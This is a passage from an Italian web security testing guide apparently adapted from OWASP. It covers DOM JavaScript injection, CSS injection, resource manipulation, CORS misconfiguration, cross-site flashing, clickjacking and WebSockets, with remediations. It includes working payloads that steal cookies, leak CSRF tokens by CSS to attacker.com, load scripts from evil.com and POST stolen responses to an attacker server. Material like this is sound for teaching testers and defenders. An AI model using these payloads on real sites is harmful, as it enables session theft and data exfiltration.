Con una leggera modifica, il snippet sopra potrebbe essere vulnerabile all'iniezione JavaScript.

    var redir = location.hash.substring(1);
    if (redir) {
        window.location=decodeURIComponent(redir);
    }

Questo può essere sfruttato inviando la seguente query string:

    http://www.victim.site/?#javascript:alert(document.cookie)
    
**Rimedi** 
* Implementare una robusta validazione dell'input per garantire che gli URL forniti dall'utente siano sicuri e autorizzati. Ad esempio, è possibile utilizzare una lista bianca di domini consentiti a cui gli utenti possono essere reindirizzati. Se possibile, evitare di utilizzare input utente per generare reindirizzamenti. Utilizzare invece percorsi predefiniti o identificatori unici per le pagine di destinazione.
* Sanificare l'input dell'utente per rimuovere qualsiasi contenuto pericoloso. Utilizzare funzioni di escaping per codificare caratteri speciali e prevenire l'iniezione di JavaScript.

#### 5 - Test per le iniezioni CSS
In generale, consentire agli utenti di personalizzare le pagine fornendo file CSS personalizzati rappresenta un rischio considerevole.
Iniettare codice nel contesto CSS può fornire a un attaccante la possibilità di eseguire JavaScript in determinate condizioni, o di estrarre valori sensibili utilizzando selettori e funzioni CSS in grado di generare richieste HTTP. 

Il seguente codice JavaScript mostra uno script potenzialmente vulnerabile in cui l'attaccante è in grado di controllare `location.hash` (sorgente) che raggiunge la funzione `cssText` (sink).

    <a id="a1">Cliccami</a>
    <script>
        if (location.hash.slice(1)) {
            document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
        }
    </script>

L'attaccante potrebbe colpire la vittima chiedendo loro di visitare i seguenti URL:
* `www.victim.com/#red;-o-link:'<javascript:alert(1)>';-o-link-source:current; `
* `www.victim.com/#red;-:expression(alert(URL=1));`

La stessa vulnerabilità può apparire nel caso di XSS riflesso, per esempio, nel seguente codice PHP:

    <style>
    p {
        color: <?php echo $_GET['color']; ?>;
        text-align: center;
    }
    </style>

Ulteriori scenari di attacco coinvolgono la possibilità di estrarre dati attraverso l'adozione di regole CSS puri. Tali attacchi possono essere condotti tramite selettori CSS, portando all'esfiltrazione di dati, ad esempio, token CSRF.

Ecco un esempio di codice che tenta di selezionare un input con un nome corrispondente a `csrf_token` e un valore che inizia con una "a". Utilizzando un attacco brute-force per determinare il valore dell'attributo, è possibile eseguire un attacco che invia il valore al dominio dell'attaccante, ad esempio, tentando di impostare un'immagine di sfondo sull'elemento input selezionato.

    <style>
    input[name=csrf_token][value=^a] {
        background-image: url(http://attacker.com/log?a);
    }
    </style>

**Come testarlo**
Il codice dovrebbe essere analizzato per determinare se a un utente è consentito iniettare contenuto nel contesto CSS. In particolare, va ispezionata la modalità con cui il sito web restituisce le regole CSS in base agli input forniti.

    <a id="a1">Cliccami</a>
    <b>Ciao</b>
    <script>
        $("a").click(function(){
            $("b").attr("style","color: " + location.hash.slice(1));
        });
    </script>

Le seguenti pagine forniscono esempi di vulnerabilità di iniezione CSS:
* ["Password 'cracker' via CSS e HTML5"](http://html5sec.org/invalid/?length=25)
* ["Lettura degli attributi CSS"](http://eaea.sirdarckcat.net/cssar/v2/)
* ["Attacchi basati su JavaScript utilizzando CSSStyleDeclaration con input non escaped"](https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink)

**Rimedi**
* Sanitizzazione e validazione
* Evitare di utilizzare input degli utenti direttamente nei contesti CSS. Utilizzare classi CSS predefinite e assegnarle in base a input validati, piuttosto che inserire direttamente stili.
* Implementare una CSP rigorosa per limitare le origini delle risorse, riducendo la possibilità che codice malevolo venga eseguito nel contesto del browser.

#### 6 - Test per la manipolazione delle risorse client side
Una vulnerabilità di manipolazione delle risorse client-side è un difetto di convalida dell'input.
Questa vulnerabilità consente di controllare gli URL che collegano a determinate risorse presenti in una pagina web.

Il seguente codice JavaScript mostra uno script vulnerabile in cui un attaccante può controllare location.hash (sorgente) che raggiunge l'attributo src di un elemento script. Questo caso particolare porta a un attacco XSS poiché JavaScript esterno potrebbe essere iniettato.

    <script>
        var d=document.createElement("script");
        if(location.hash.slice(1)) {
            d.src = location.hash.slice(1);
        }
        document.body.appendChild(d);
    </script>

Un attaccante potrebbe prendere di mira una vittima costringendola a visitare questo URL:

    www.victim.com/#http://evil.com/js.js

Dove `js.js` contiene:

    alert(document.cookie);

Uno scenario più dannoso comporta la possibilità di controllare l'URL chiamato in una richiesta CORS. Poiché CORS consente alla risorsa target di essere accessibile dal dominio richiedente attraverso un approccio basato su header, l'attaccante potrebbe chiedere alla pagina target di caricare contenuti dannosi dal proprio sito.

    <b id="p"></b>
    <script>
        function createCORSRequest(method, url) {
            var xhr = new XMLHttpRequest();
            xhr.open(method, url, true);
            xhr.onreadystatechange = function () {
                if (this.status == 200 && this.readyState == 4) {
                    document.getElementById('p').innerHTML = this.responseText;
                }
            };
            return xhr;
        }

        var xhr = createCORSRequest('GET', location.hash.slice(1));
        xhr.send(null);
    </script>

Il location.hash è controllato dall'input dell'utente ed è utilizzato per richiedere una risorsa esterna, che verrà poi riflessa attraverso la costruzione di innerHTML. Un attaccante potrebbe chiedere a una vittima di visitare il seguente URL:

    www.victim.com/#http://evil.com/html.html

Con il payload per `html.html`:

    <?php
    header('Access-Control-Allow-Origin: http://www.victim.com');
    ?>
    <script>alert(document.cookie);</script>

**Come testarlo**
Per controllare manualmente questo tipo di vulnerabilità, dobbiamo identificare se l'applicazione utilizza input senza convalidarli correttamente. 

La seguente tabella mostra i possibili punti di iniezione (sink) che dovrebbero essere controllati:

| Tipo di Risorsa     | Tag/Metodo                               | Sink        |
|---------------------|------------------------------------------|-------------|
| Frame               | iframe                                   | src         |
| Link                | a                                        | href        |
| Richiesta AJAX      | `xhr.open(method, [url], true);`         | URL         |
| CSS                 | link                                     | href        |
| Immagine            | img                                      | src         |
| Oggetto             | object                                   | data        |
| Script              | script                                   | src         |

**Rimedi**
* Fare sanitizzazione e validazione dell'input
* Configurare correttamente le intestazioni CORS per consentire solo le richieste da domini specifici e attendibili. Evitare di utilizzare wildcard (*) per `Access-Control-Allow-Origin`, se non necessario.
* Non utilizzare direttamente location.hash per costruire URL o altre risorse. Invece, considerare l'uso di metodi di navigazione più sicuri o di un meccanismo di routing più controllato.

#### 7 - Test per il Cross Origin Resource Sharing (CORS)
Il CORS è un meccanismo che consente ad un browser di effettuare richieste cross-domain in modo controllato.
In passato infatti erano consentite richieste solo all'interno della stessa origine.

La specifica CORS richiede che per richieste non semplici (diverse fa GET o POST), venga inviata in anticipo una richiesta OPTION per verificare se il tipo di richiesta avrà un impatto negativo sui dati.

*`Origin` e `Access-Control-Allow-Origin`* 
L'intestazione di richiesta `Origin` è sempre inviata dal browser in una richiesta CORS e indica l'origine della richiesta.    
L'intestazione Origin non può essere modificata tramite JavaScript, poiché il browser (l'user-agent) blocca la sua modifica; tuttavia, fare affidamento su questa intestazione per controlli di accesso non è una buona idea, poiché può essere falsificata al di fuori del browser, ad esempio utilizzando un proxy. È quindi necessario garantire che vengano utilizzati protocolli a livello applicativo per proteggere i dati sensibili.

L'intestazione di risposta `Access-Control-Allow-Origin` è utilizzata da un server per indicare quali domini sono autorizzati a leggere la risposta.

Da una prospettiva di testing della sicurezza, è necessario cercare configurazioni insicure, come ad esempio l'uso di un asterisco (*) come valore dell'intestazione Access-Control-Allow-Origin, che significa che tutti i domini sono consentiti. 
Un altro esempio insicuro è quando il server restituisce l'intestazione origin senza ulteriori controlli, il che può portare all'accesso a dati sensibili.

*`Access-Control-Request-Method` e `Access-Control-Allow-Method`*
L'intestazione `Access-Control-Request-Method` è utilizzata quando un browser effettua una richiesta preflight OPTIONS e consente al client di indicare il metodo di richiesta della richiesta finale. D'altra parte, l'intestazione `Access-Control-Allow-Method` è un'intestazione di risposta utilizzata dal server per descrivere i metodi che i client sono autorizzati a utilizzare.

*`Access-Control-Request-Headers` & `Access-Control-Allow-Headers`*
Queste due intestazioni sono utilizzate tra il browser e il server per determinare quali intestazioni possono essere utilizzate per effettuare una richiesta cross-origin.

*`Access-Control-Allow-Credentials`*
Questa intestazione di risposta consente ai browser di leggere la risposta quando vengono passate credenziali.

*Validazione dell'input*
L'XHR L2 introduce la possibilità di creare una richiesta cross-domain utilizzando l'API XHR per garantire la compatibilità con le versioni precedenti. Ciò può introdurre vulnerabilità di sicurezza che nell'XHR L1 non erano presenti. Punti interessanti del codice da sfruttare sarebbero gli URL passati a XMLHttpRequest senza validazione, specialmente se sono consentiti URL assoluti, poiché ciò potrebbe portare a iniezione di codice.

Per altre intestazioni, è visitabile il documeto [CORS MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#The_HTTP_response_headers)

**Come testarlo**
Uno strumento come ZAP può consentire ai tester di intercettare le intestazioni HTTP, rivelando come viene utilizzato CORS. I tester dovrebbero prestare particolare attenzione all'intestazione origin per scoprire quali domini sono autorizzati.

*Misconfigurazione di CORS*
Impostare l'asterisco nell'intestazione Access-Control-Allow-Origin (ossia, Access-Control-Allow-Origin: *) non è sicuro se la risposta contiene informazioni sensibili. Anche se non può essere utilizzato contemporaneamente con Access-Control-Allow-Credentials: true, può essere pericoloso quando il controllo degli accessi è effettuato esclusivamente dalle regole del firewall o dagli indirizzi IP sorgente, piuttosto che essere protetto da credenziali.

*`Access-Control-Allow-Origin` Wildcard*
Un tester può verificare se l'Access-Control-Allow-Origin: * esiste nei messaggi di risposta HTTP.

    HTTP/1.1 200 OK
    [...]
    Access-Control-Allow-Origin: *
    Content-Length: 4
    Content-Type: application/xml

Se una risposta contiene dati sensibili, un attaccante può rubarli tramite l'uso di XHR:

    <html>
        <head></head>
        <body>
            <script>
                var xhr = new XMLHttpRequest();
                xhr.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        var xhr2 = new XMLHttpRequest();
                        // attacker.server: attaccante ascoltatore per rubare la risposta
                        xhr2.open("POST", "http://attacker.server", true);
                        xhr2.send(xhr.responseText);
                    }
                };
                // victim.site: server vulnerabile con intestazione `Access-Control-Allow-Origin: *` 
                xhr.open("GET", "http://victim.site", true);
                xhr.send();
            </script>
        </body>
    </html>

*Politica sulla CORS dinamica*
Un'applicazione web moderna o un'API possono essere implementate per consentire richieste cross-origin dinamicamente, generalmente per consentire richieste dai sottodomini, come nel seguente esempio:

    if (preg_match('|\.example.com$|', $_SERVER['SERVER_NAME'])) {
    header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
    ...
    }

In questo esempio, tutte le richieste dai sottodomini di example.com saranno autorizzate. È fondamentale garantire che l'espressione regolare utilizzata per il confronto sia completa. Altrimenti, se fosse semplicemente confrontata con example.com (senza $ finale), gli attaccanti potrebbero aggirare la politica CORS aggiungendo il loro dominio all'intestazione Origin.

    GET /test.php HTTP/1.1
    Host: example.com
    [...]
    Origin: http://example.com.attacker.com
    Cookie: <session cookie>

Quando la richiesta sopra viene inviata, se viene restituita la seguente risposta con l'Access-Control-Allow-Origin il cui valore è lo stesso dell'input dell'attaccante, l'attaccante può leggere la risposta in seguito e accedere a informazioni sensibili disponibili solo per un utente vittima.

    HTTP/1.1 200 OK
    [...]
    Access-Control-Allow-Origin: http://example.com.attacker.com
    Access-Control-Allow-Credentials: true
    Content-Length: 4
    Content-Type: application/xml

*Debolezze nell validazione dell'input*
Il concetto di CORS può essere visto da un'angolazione completamente diversa. Un attaccante potrebbe volutamente consentire la propria politica CORS per iniettare codice nell'applicazione web di destinazione.
Questo codice effettua una richiesta alla risorsa passata dopo il carattere # nell'URL, inizialmente utilizzato per ottenere risorse nello stesso server.

    <script>
        var req = new XMLHttpRequest();

        req.onreadystatechange = function() {
            if(req.readyState==4 && req.status==200) {
                document.getElementById("div1").innerHTML=req.responseText;
            }
        }

        var resource = location.hash.substring(1);
        req.open("GET", resource, true);
        req.send();
    </script>

    <body>
        <div id="div1"></div>
    </body>

Ad esempio, una richiesta come questa mostrerà i contenuti del file profile.php:

    http://example.foo/main.php#profile.php
    
Richiesta e risposta generate da `http://example.foo/profile.php`:

    GET /profile.php HTTP/1.1
    Host: example.foo
    [...]
    Referer: http://example.foo/main.php
    Connection: keep-alive

    HTTP/1.1 200 OK
    [...]
    Content-Length: 25
    Content-Type: text/html

Ora, poiché non c'è validazione dell'URL, possiamo iniettare uno script remoto, che sarà iniettato ed eseguito nel contesto del dominio example.foo, con un URL come questo:

    http://example.foo/main.php#http://attacker.bar/file.php
    
Richiesta e risposta generate da `http://attacker.bar/file.php`:

    GET /file.php HTTP/1.1
    Host: attacker.bar
    [...]
    Referer: http://example.foo/main.php
    origin: http://example.foo

    HTTP/1.1 200 OK
    [...]
    Access-Control-Allow-Origin: *
    Content-Length: 92
    Content-Type: text/html

    Injected Content from attacker.bar <img src="#" onerror="alert('Domain: '+document.domain)">

**Rimedi**
* Non utilizzare `Access-Control-Allow-Origin: *` se la risposta contiene dati sensibili. Specificare esplicitamente i domini autorizzati.
*  Implementare una whitelist delle origini da cui è consentito l'accesso. Questo può essere fatto controllando se l'Origin della richiesta è in una lista predefinita di domini consentiti.
* Utilizzare `Access-Control-Allow-Methods` per specificare solo i metodi HTTP necessari (ad esempio, GET, POST) e limitare ulteriormente quelli consentiti.
* Utilizzare `Access-Control-Allow-Headers` per specificare solo le intestazioni che sono necessarie.

#### 8 - Test per il Cross Site Flashing

*Traduzione senza riassunto*

ActionScript, basato su ECMAScript, è il linguaggio utilizzato dalle applicazioni Flash per gestire esigenze interattive. Ci sono tre versioni del linguaggio ActionScript. ActionScript 1.0 e ActionScript 2.0 sono molto simili, con ActionScript 2.0 che rappresenta un'estensione di ActionScript 1.0. ActionScript 3.0, introdotto con Flash Player 9, è una riscrittura del linguaggio per supportare il design orientato agli oggetti.

Come ogni altro linguaggio, ActionScript ha alcuni modelli di implementazione che possono portare a problemi di sicurezza. In particolare, poiché le applicazioni Flash sono spesso integrate nei browser, potrebbero essere presenti vulnerabilità come il Cross Site Scripting basato sul DOM (DOM XSS) in applicazioni Flash difettose.

Il Cross-Site Flashing (XSF) è una vulnerabilità che ha un impatto simile all'XSS.
XSF si verifica quando si attivano i seguenti scenari da domini diversi:
* Un filmato carica un altro filmato con le funzioni loadMovie* (o altri hack) e ha accesso alla stessa sandbox, o a parte di essa.
* Una pagina HTML utilizza JavaScript per comandare un filmato Adobe Flash, ad esempio, chiamando:
    * GetVariable per accedere a oggetti pubblici e statici Flash da JavaScript come stringa.
    * SetVariable per impostare un oggetto Flash statico o pubblico a un nuovo valore di stringa con JavaScript.
* Comunicazioni inattese tra il browser e l'applicazione SWF, che potrebbero portare al furto di dati dall'applicazione SWF.

XSF può essere eseguito costringendo un SWF difettoso a caricare un file Flash esterno malevolo. Questo attacco potrebbe portare a XSS o alla modifica dell'interfaccia utente per ingannare un utente a inserire credenziali in un falso modulo Flash. L'XSF potrebbe essere utilizzato in presenza di Flash HTML Injection o file SWF esterni quando si utilizzano i metodi loadMovie*.

*Redirector aperto*
Gli SWF hanno la capacità di navigare nel browser. Se lo SWF riceve la destinazione come FlashVar, allora può essere utilizzato come un redirector aperto. Un redirector aperto è qualsiasi funzionalità di un sito web fidato che un attaccante può utilizzare per reindirizzare l'utente finale a un sito web malevolo. Questi sono frequentemente utilizzati negli attacchi di phishing. Simile al cross-site scripting, l'attacco coinvolge un utente che clicca su un link malevolo.

Nel caso di Flash, l'URL malevolo potrebbe apparire come:

    http://trusted.example.org/trusted.swf?getURLValue=http://www.evil-spoofing-website.org/phishEndUsers.html

In questo esempio, un utente finale potrebbe vedere che l'URL inizia con il proprio sito web fidato e cliccarci sopra. Il link caricherebbe lo SWF fidato che prende il getURLValue e lo fornisce a una chiamata di navigazione del browser ActionScript:

    getURL(_root.getURLValue,"_self");

Questo navigherebbe il browser verso l'URL malevolo fornito dall'attaccante. A questo punto, il phisher ha sfruttato con successo la fiducia che l'utente ha in trusted.example.org per ingannarlo a visitare il proprio sito web malevolo. Da lì, potrebbero lanciare un attacco 0-day, condurre spoofing del sito web originale o qualsiasi altro tipo di attacco. Gli SWF potrebbero agire involontariamente come un redirector aperto sul sito web.

Gli sviluppatori dovrebbero evitare di prendere URL completi come FlashVars. Se intendono navigare solo all'interno del proprio sito web, dovrebbero utilizzare URL relativi o verificare che l'URL inizi con un dominio e protocollo fidato.

*Attacchi e versione di Flash Player*
Dal maggio 2007, Adobe ha rilasciato tre nuove versioni di Flash Player. Ogni nuova versione limita alcuni degli attacchi precedentemente descritti.

| Versione     | Player | asfunction | ExternalInterface | GetURL | HTML Injection   |
|--------------|--------|------------|--------------------|--------|------------------|
| v9.0 r47/48  | Sì     | Sì         | Sì                 | Sì     | Sì               |
| v9.0 r115    | No     | Sì         | Sì                 | Sì     | Sì               |
| v9.0 r124    | No     | Sì         | Sì                 | Parzialmente |                  |

**Come testarlo**
Dalla prima pubblicazione di Testing Flash Applications, sono state rilasciate nuove versioni di Flash Player per mitigare alcuni degli attacchi descritti. Tuttavia, alcune problematiche rimangono sfruttabili poiché sono il risultato di pratiche di programmazione insicure.

*Decompilazione*
Poiché i file SWF sono interpretati da una macchina virtuale integrata nel player stesso, possono essere potenzialmente decompilati e analizzati. Il decompilatore ActionScript 2.0 più conosciuto e gratuito è flare.

Per decompilare un file SWF con flare, basta digitare:

    $ flare hello.swf

Questo produce un nuovo file chiamato hello.flr.

La decompilazione aiuta i tester perché consente il testing white-box delle applicazioni Flash. Una rapida ricerca web può portarti a vari disassemblatori e strumenti di sicurezza Flash.

*Variabili indefinite FlashVars*
FlashVars sono le variabili che lo sviluppatore SWF prevedeva di ricevere dalla pagina web. Le FlashVars vengono tipicamente passate tramite il tag Object o Embed all'interno dell'HTML. Ad esempio:

    <object width="550" height="400" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
    codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,124,0">
        <param name="movie" value="somefilename.swf">
        <param name="FlashVars" value="var1=val1&var2=val2">
        <embed src="somefilename.swf" width="550" height="400" FlashVars="var1=val1&var2=val2">
        </embed>
    </object>

Le FlashVars possono anche essere inizializzate dall'URL:

    http://www.example.org/somefilename.swf?var1=val1&var2=val2

In ActionScript 3.0, uno sviluppatore deve assegnare esplicitamente i valori delle FlashVar a variabili locali. Tipicamente, ciò appare così:

    var paramObj:Object = LoaderInfo(this.root.loaderInfo).parameters;
    var var1:String = String(paramObj["var1"]);
    var var2:String = String(paramObj["var2"]);

In ActionScript 2.0, qualsiasi variabile globale non inizializzata è considerata una FlashVar. Le variabili globali sono quelle che sono precedute da _root, _global o _level0. Questo significa che se un attributo come _root.varname è indefinito nel flusso di codice, potrebbe essere sovrascritto dai parametri URL:

    http://victim/file.swf?varname=value

Indipendentemente dal fatto che tu stia guardando ActionScript 2.0 o ActionScript 3.0, le FlashVars possono essere un vettore di attacco. Ecco un esempio di codice ActionScript 2.0 vulnerabile:

    movieClip 328 __Packages.Locale {
    #initclip
        if (!_global.Locale) {
            var v1 = function (on_load) {
                var v5 = new XML();
                var v6 = this;
                v5.onLoad = function (success) {
                    if (success) {
                        trace('Locale loaded xml');
                        var v3 = this.xliff.file.body.$trans_unit;
                        var v2 = 0;
                        while (v2 < v3.length) {
                            Locale.strings[v3[v2]._resname] = v3[v2].source.__text;
                            ++v2;
                        }
                        on_load();
                    } else {}
                };
                if (_root.language != undefined) {
                    Locale.DEFAULT_LANG = _root.language;
                }
                v5.load(Locale.DEFAULT_LANG + '/player_' + Locale.DEFAULT_LANG + '.xml');
            };
        }
    }

Il codice sopra potrebbe essere attaccato richiedendo:

    http://victim/file.swf?language=http://evil.example.org/malicious.xml

*Metodi non sicuri*
Quando viene identificato un punto d'ingresso, i dati che rappresenta possono essere utilizzati da metodi non sicuri. Se i dati non vengono filtrati o convalidati, potrebbero portare a vulnerabilità.

I metodi non sicuri dalla versione r47 sono:

    loadVariables()
    loadMovie()
    getURL()
    loadMovie()
    loadMovieNum()
    FScrollPane.loadScrollContent()
    LoadVars.load
    LoadVars.send
    XML.load( 'url' )
    LoadVars.load( 'url' )
    Sound.loadSound( 'url' , isStreaming );
    NetStream.play( 'url' );
    flash.external.ExternalInterface.call(_root.callback)
    htmlText

*Sfruttamento tramite XSS riflesso*
Il file swf deve essere ospitato sull'host della vittima e devono essere utilizzate le tecniche di XSS riflesso. Un aggressore costringe il browser a caricare un file swf puro direttamente nella barra di localizzazione (tramite reindirizzamento o social engineering) o caricandolo attraverso un iframe da una pagina malvagia:

    <iframe src='http://victim/path/to/file.swf'></iframe>

In questa situazione, il browser autogenererà una pagina HTML come se fosse ospitata dall'host vittima.

*GetURL (AS2)/NabigateToURL (AS3)*
La funzione GetURL in ActionScript 2.0 e NavigateToURL in ActionScript 3.0 consente al filmato di caricare un URI nella finestra del browser. Se una variabile non definita viene utilizzata come primo argomento per getURL:

    getURL(_root.URI,'_targetFrame');

Oppure se una FlashVar viene utilizzata come parametro passato alla funzione navigateToURL:

    var request:URLRequest = new URLRequest(FlashVarSuppliedURL);
    navigateToURL(request);

Questo significa che è possibile chiamare JavaScript nello stesso dominio in cui è ospitato il filmato richiedendo:

    http://victim/file.swf?URI=javascript:evilcode
    
<br>

    getURL('javascript:evilcode','_self');

La stessa cosa è possibile quando solo una parte di getURL è controllata tramite iniezione DOM con l'iniezione JavaScript di Flash:

    getUrl('javascript:function('+_root.arg+')');

*Utilizzo di asfunction*
Puoi usare il protocollo speciale asfunction per fare in modo che il link esegua una funzione ActionScript in un file SWF anziché aprire un URL. Fino alla release Flash Player 9 r48, asfunction poteva essere utilizzato su ogni metodo che avesse un URL come argomento. Dopo quella release, l'uso di asfunction è stato limitato ai campi di testo HTML.

Questo significa che un tester potrebbe tentare di iniettare:

    asfunction:getURL,javascript:evilcode

in ogni metodo non sicuro, come:

    loadMovie(_root.URL)

richiedendo:

    http://victim/file.swf?URL=asfunction:getURL,javascript:evilcode
    
*ExternalInterface*
ExternalInterface.call è un metodo statico introdotto da Adobe per migliorare l'interazione tra il player e il browser sia per ActionScript 2.0 che per ActionScript 3.0.

Dal punto di vista della sicurezza, potrebbe essere abusato quando parte del suo argomento può essere controllato:

    flash.external.ExternalInterface.call(_root.callback);

Il pattern di attacco per questo tipo di vulnerabilità potrebbe essere simile al seguente:

    eval(evilcode)

Poiché il JavaScript interno eseguito dal browser sarà qualcosa di simile a:

    eval('try { __flash__toXML('+__root.callback+') ; } catch (e) { "<undefined/>"; }')

*Iniezione HTML*
Gli oggetti TextField possono renderizzare HTML minimale impostando:

    tf.html = true
    tf.htmlText = '<tag>testo</tag>'

Quindi, se una parte del testo può essere controllata dal tester, è possibile iniettare un tag <a> o un tag immagine, modificando così l'interfaccia utente o eseguendo un attacco XSS sul browser.

Alcuni esempi di attacco con tag <a>:
* XSS diretto: `<a href='javascript:alert(123)'>`
* Chiamata a una funzione: `<a href='asfunction:function,arg'>`
* Chiamata a funzioni pubbliche SWF: `<a href='asfunction:_root.obj.function,arg'>`
* Chiamata a funzioni statiche native: `<a href='asfunction:System.Security.allowDomain,evilhost'>`

Anche un tag immagine potrebbe essere utilizzato:

    <img src='http://evil/evil.swf'>

In questo esempio, .swf è necessario per bypassare il filtro interno del Flash Player:

    <img src='javascript:evilcode//.swf'>

Dalla release di Flash Player 9.0.124.0, l'XSS non è più sfruttabile, ma la modifica dell'interfaccia utente potrebbe ancora essere realizzata.

**Rimedi**
* Sempre convalidare e filtrare i dati ricevuti tramite FlashVars o URL per evitare l’inserimento di dati malevoli.
* Evitare di utilizzare variabili FlashVars non controllate. Se necessario, limitare le FlashVars a valori specifici o predeterminati.
* Quando si devono gestire URL, preferire l'uso di URL relativi anziché assoluti, per ridurre il rischio di reindirizzamento verso domini malevoli.
* Limitare l’uso di ExternalInterface.call, assicurandosi che solo funzioni sicure e necessarie siano esposte e che i parametri passati siano validati.
* Non utilizzare metodi come loadMovie(), getURL(), o loadVariables() con input non filtrati. Considerare alternative più sicure o implementare logiche di controllo.

#### 9 - Test per il clickjacking
Il clickjacking, una sotto-categoria del UI redressing, è una tecnica malevola attraverso cui un utente web viene ingannato a interagire (nella maggior parte dei casi cliccando) con qualcosa di diverso da ciò che crede di interagire.

Per attuare questo attacco, un aggressore crea una pagina web apparentemente innocua che carica l'applicazione target tramite l'uso di un frame inline (nascosto con codice CSS). Una volta fatto ciò, un attaccante può indurre la vittima a interagire con la pagina web attraverso altri mezzi (ad esempio, tramite ingegneria sociale). Come per altri attacchi, un prerequisito comune è che la vittima sia autenticata nell'applicazione target dell'aggressore.

La potenza di questo metodo è che le azioni eseguite dalla vittima provengono dalla pagina web target autentica, sebbene nascosta.

**Come testarlo**
Come menzionato sopra, questo tipo di attacco è spesso progettato per consentire a un attaccante di indurre azioni degli utenti sul sito target, anche se vengono utilizzati token anti-CSRF.

*Carica la pagina web target su un interprete HTML utilizzando il tag iframe*
I siti non protetti contro il frame busting sono vulnerabili agli attacchi di clickjacking. Se la pagina web http://www.target.site viene caricata con successo in un frame, allora il sito è vulnerabile al clickjacking. Un esempio di codice HTML per creare questa pagina web di test è mostrato nel seguente frammento:

    <html>
        <head>
            <title>Pagina web di test Clickjack</title>
        </head>
        <body>
            <iframe src="http://www.target.site" width="400" height="400"></iframe>
        </body>
    </html>

Poiché questi tipi di protezioni lato client si basano su codice JavaScript per il frame busting, se la vittima ha JavaScript disabilitato o se è possibile per un attaccante disabilitare il codice JavaScript, la pagina web non avrà alcun meccanismo di protezione contro il clickjacking.

Esistono alcune tecniche di disattivazione che possono essere utilizzate con i frame. Tecniche più approfondite possono essere trovate nel [Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html).

*Attributo sandbox*
Con HTML5 è disponibile un nuovo attributo chiamato "sandbox". Esso abilita una serie di restrizioni sui contenuti caricati nell'iframe.

    <iframe src="http://example.org" sandbox></iframe>

*Testa l'applicazione in modalità compatibilità e acccessibilità*
Le versioni mobili della pagina web sono solitamente più piccole e veloci rispetto a quelle desktop e devono essere meno complesse rispetto all'applicazione principale. Le varianti mobili spesso hanno meno protezione. Tuttavia, un attaccante può falsificare l'origine reale fornita da un browser web, e una vittima non mobile potrebbe essere in grado di visitare un'applicazione progettata per utenti mobili. Questo scenario potrebbe consentire all'attaccante di sfruttare una versione mobile della pagina web. Le applicazioni in modalità accessibilità dovrebbero anche essere testate contro il clickjacking, poiché il framing del sito potrebbe essere influenzato.

*Protezione lato server*
L'intestazione di risposta HTTP Content-Security-Policy (CSP) consente agli amministratori delle pagine web di controllare le risorse che l'agente utente è autorizzato a caricare per una data pagina web. La direttiva frame-ancestors nella CSP specifica i genitori accettabili che possono incorporare una pagina web utilizzando i tag `<frame>, <iframe>, <object>, <embed> o <applet>`.

*Testare l'intestazione Content-Security-Policy CSP*
* Utilizzando un browser, apri gli strumenti per sviluppatori e accedi alla pagina web target. Vai alla scheda Network.
* Cerca la richiesta che carica la pagina web. Dovrebbe avere lo stesso dominio della pagina web - di solito è il primo elemento nella scheda Network.
* Una volta cliccato sul file, appariranno ulteriori informazioni. Cerca un codice di risposta 200 OK.
* Scorri verso il basso fino alla sezione delle intestazioni di risposta. La sezione Content-Security-Policy indica il livello di protezione adottato.

*Proxy*
I proxy web sono noti per aggiungere e rimuovere intestazioni. Nel caso in cui un proxy web rimuova l'intestazione X-FRAME-OPTIONS, il sito perde la sua protezione contro il framing.

*Versione mobile*
In questo caso, poiché l'intestazione HTTP X-FRAME-OPTIONS deve essere implementata in ogni pagina dell'applicazione, gli sviluppatori potrebbero non aver protetto ogni singola pagina della versione mobile.

**Rimedi**
* Utilizzare l'intestazione `X-FRAME-OPTIONS`: questa intestazione impedisce che la pagina venga caricata all'interno di un iframe su domini non autorizzati.
* Implementare una Content Security Policy che utilizzi la direttiva frame-ancestors per specificare quali domini possono incorporare la pagina. Tipo : `Content-Security-Policy: frame-ancestors 'self';`
* Se è necessario utilizzare iframe, l'attributo sandbox può limitare le azioni che il contenuto caricato può eseguire. Questo può ridurre il rischio di attacchi di clickjacking, specialmente se combinato con altre misure.

Per indicazioni sicure, leggere il [Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html).
Per laboratori interattivi guarda il [Port Swigger](https://portswigger.net/web-security/clickjacking). 

#### 10 - Test sulle WebSockets
I WebSocket consentono al client o al server di creare un canale di comunicazione 'full-duplex' (bidirezionale), permettendo una vera comunicazione asincrona tra client e server. I WebSocket conducono il loro handshake iniziale di aggiornamento tramite HTTP e, da quel momento in poi, tutta la comunicazione avviene attraverso canali TCP utilizzando frame. 

    WebSocket possono essere utilizzati su TCP non crittografato o su TLS crittografato. Per utilizzare WebSocket non crittografati si usa lo schema URI `ws://` (porta predefinita 80), mentre per utilizzare WebSocket crittografati (TLS) si usa lo schema URI `wss://` (porta predefinita 443).

Come per qualsiasi dato proveniente da fonti non attendibili, i dati dovrebbero essere adeguatamente sanitizzati e codificati. 

**Come testarlo**
**Black box**
* Identificare che l'applicazione utilizza i WebSocket.
    * Ispezionare il codice sorgente lato client per il ws:// o wss:// schema URI.
    * Utilizzare gli Strumenti per Sviluppatori di Google Chrome per visualizzare la comunicazione WebSocket nella rete.
    * Utilizzare la scheda WebSocket di ZAP.
* Origine.
    * Utilizzando un client WebSocket (ne puoi trovare uno nella sezione Strumenti qui sotto), tentare di connettersi al server WebSocket remoto. Se viene stabilita una connessione, il server potrebbe non controllare l'intestazione origin dell'handshake dei WebSocket.
* Riservatezza e Integrità.
    * Controllare che la connessione WebSocket utilizzi TLS per trasmettere informazioni sensibili wss://.
    * Controllare l'implementazione HTTPS per problemi di sicurezza (Certificato valido, BEAST, CRIME, RC4, ecc.). Riferirsi alla sezione Testing for Weak Transport Layer Security di questa guida.
* Autenticazione.
    * I WebSocket non gestiscono l'autenticazione, dovrebbero essere effettuati normali test di autenticazione black-box. Riferirsi alle sezioni di Testing dell'Autenticazione di questa guida.
* Autorizzazione.
